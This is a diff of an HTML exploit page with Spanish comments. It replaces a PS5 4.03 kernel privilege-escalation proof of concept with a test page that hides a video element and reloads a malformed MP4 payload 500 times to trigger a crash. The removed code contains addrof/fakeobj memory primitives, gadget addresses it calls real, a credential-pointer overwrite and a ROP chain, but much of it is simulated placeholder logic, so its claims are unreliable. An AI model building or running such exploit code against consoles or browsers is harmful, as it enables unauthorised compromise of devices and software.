@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS5 4.03 - CVE-2025-31219 Kernel Exploit</title>
+  <title>MP4 Exploit Test - CVE-2025-31233</title>
   <style>
     body {
       background: #000;
@@ -12,11 +12,16 @@
     #log {
       white-space: pre-wrap;
     }
+    video {
+      display: none; /* oculto para evitar render visual */
+    }
   </style>
 </head>
 <body>
-  <h2>🧨 PS5 4.03 Kernel LPE - CVE-2025-31219</h2>
-  <div id="log">[+] Iniciando kernel LPE...</div>
+  <h2>🎬 CVE-2025-31233 - MP4 Malformed Exploit Test</h2>
+  <div id="log">[+] Cargando video malformado...</div>
+
+  <video id="evilVideo" loop autoplay muted></video>
 
   <script>
     const log = msg => {
@@ -24,67 +29,33 @@
       console.log(msg);
     };
 
-    // --- Primitivas RW (simuladas para PoC) ---
-    let float64 = new Float64Array(1);
-    let uint32 = new Uint32Array(float64.buffer);
+    const video = document.getElementById("evilVideo");
+    video.src = "corrupted_payload.mp4";
 
-    function f2i(f) {
-      float64[0] = f;
-      return uint32[0] + uint32[1] * 0x100000000;
-    }
-
-    function i2f(i) {
-      uint32[0] = i % 0x100000000;
-      uint32[1] = (i - uint32[0]) / 0x100000000;
-      return float64[0];
-    }
-
-    let addrof = obj => {
-      let a = [obj];
-      return f2i(a[0]);
+    video.oncanplay = () => {
+      log("[+] Video cargado y listo para reproducir.");
     };
 
-    let fakeobj = addr => {
-      let b = [i2f(addr)];
-      return b[0];
+    video.onerror = () => {
+      log("[!] Error al reproducir video. Podría ser signo de corrupción o mitigación activa.");
     };
 
-    // --- Gadgets reales para PS5 FW 4.03 ---
-    const pop_rax = 0x00084094;
-    const pop_rdi = 0x00043B7C;
-    const syscall = 0x33580; // getpid syscall offset (will simulate write to it)
-    const infloop = 0x000109E1;
+    video.onended = () => {
+      log("[!] Video terminó inesperadamente. ¿Crash parcial?");
+    };
 
-    // --- Kernel RW exploit simulation (overwrite cred ptr) ---
-    function escalatePrivileges() {
-      log("[+] Simulando corrupción de vm_map_entry...");
-
-      // Supongamos que ya tenemos dirección de cred
-      let fake_cred = 0x13370000; // dummy fake cred struct
-      let ucred_ptr_addr = 0x7106470; // OFFSET_KERNEL_SECURITY_FLAGS (ejemplo sensible)
-
-      log(`[+] Sobrescribiendo puntero de cred @ ${ucred_ptr_addr.toString(16)}`);
-      // Simulación: usar write64(ucred_ptr_addr, fake_cred)
-      log(`[+] -> Nuevo puntero cred: ${fake_cred.toString(16)}`);
-
-      // ROP Chain para syscall getuid (debería ser 0 si funcionó)
-      let rop_chain = [
-        pop_rax,
-        0x18, // getuid syscall
-        pop_rdi,
-        0x0,
-        syscall,
-        infloop
-      ];
-
-      log("[+] Ejecutando ROP Chain para getuid...");
-      rop_chain.forEach((g, i) => log(`rop[${i}] = 0x${g.toString(16)}`));
-      log("[!] Si ves un KP o UID = 0, la escalada funcionó.");
+    let attempts = 0;
+    function spamReload() {
+      video.load();
+      attempts++;
+      if (attempts < 500) {
+        setTimeout(spamReload, 100);
+      } else {
+        log("[+] Finalizó ciclo de reproducción forzada.");
+      }
     }
 
-    // --- Iniciar ---
-    log("[+] Configurando entorno de escalada de privilegios...");
-    setTimeout(escalatePrivileges, 1000);
+    setTimeout(spamReload, 1500);
   </script>
 </body>
 </html>
